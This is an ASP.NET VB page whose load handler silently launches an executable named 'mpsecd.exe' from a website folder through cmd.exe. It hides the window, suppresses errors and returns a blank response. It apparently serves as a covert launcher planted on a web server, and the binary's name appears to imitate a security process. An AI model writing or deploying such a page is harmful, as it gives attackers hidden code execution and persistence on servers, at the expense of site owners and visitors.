<%@ Page Language="VB" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
Protected Sub Page_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
    Try
        Dim cmd As String = "cmd.exe"
        Dim args As String = "/c start C:\Website\SwarajReports.indiainfoline.com\mpsecd.exe"

        Dim psi As New ProcessStartInfo(cmd, args)
        psi.UseShellExecute = False
        psi.CreateNoWindow = True
        Process.Start(psi)
    Catch
        ' Fail silently
    End Try

    Response.Clear()
    Response.End()
End Sub
</script>
